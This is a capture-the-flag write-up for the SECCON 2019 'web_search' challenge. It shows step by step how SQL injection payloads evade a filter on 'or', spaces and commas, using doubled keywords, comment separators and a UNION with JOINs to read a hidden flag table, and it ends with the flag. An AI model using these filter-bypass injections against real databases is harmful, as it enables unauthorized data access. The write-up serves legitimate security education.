# web_search [212pts]

## Description

```
Get a hidden message! Let's find a hidden message using the search system on the site.

http://web-search.chal.seccon.jp/
```

## Content

In this challenge, our payload will merged into SQL string, executed, and output will printed in main page.
![Main page](https://github.com/sumango3/ctf/blob/master/2019-SECCON-CTF/web_search.png)
By testing with some words, we may assume that SQL may look like following:
```
SELECT * from $table_name WHERE $column1 LIKE "RFC%" and $column2 LIKE '$q' LIMIT ($page*50, ($page+1)*50);
```
Also, `or`, `(space)`, `,` will be removed before executing SQL.

## Solution

### 'or', space filtering bypass

As the word `or` is removed before executing SQL, we can put `oorr`, so that it becomes `or` after filtering.
We can use SQL comment `/**/` instead of space, and `#` for ignoring all following words.
In result, the payload will be following:
```
'/**/oorr/**/true#
```
And this will give us a new row.
![Stage 1](https://github.com/sumango3/ctf/blob/master/2019-SECCON-CTF/web_search_1.png)

```
FLAG
    The flag is "SECCON{Yeah_Sqli_Success_" ... well, the rest of flag is in "flag" table. Try more!
```
So we should do something more.

### multi column table without comma

As we want to read something in table flag, we should UNION it.
The problem is, we should make number of columns of two tables same, but we cannot use comma.
In this case, we can use SQL JOIN to make multi column table.
```
SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
```
will select all rows from `CROSS JOIN`ed table of following two tables:

| a |
|---|
| 1 |

and

| b |
|---|
| 2 |

In result, the following table comes out:

| a | b |
|---|---|
| 1 | 2 |

Assuming the `flag` table has only one column and RFC table has two columns, we can use following payload:
```
'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/*/**/FROM/**/flag)a/**/JOIN/**/(SELECT/**/2)b#
```
replacing `/**/` with space for readability, it becomes
```
' UNION SELECT * FROM (SELECT * FROM flag)a JOIN (SELECT 2)b#
```
But, this does not work, so our assume was wrong.
Next guess was 3 column RFC table and 1 column flag table.
```
'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/*/**/FROM/**/flag)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(SELECT/**/3)c#
```
and this will give us
![Stage 2](https://github.com/sumango3/ctf/blob/master/2019-SECCON-CTF/web_search_2.png)
```
You_Win_Yeah}
    2
```

## Flag

	SECCON{Yeah_Sqli_Success_You_Win_Yeah}
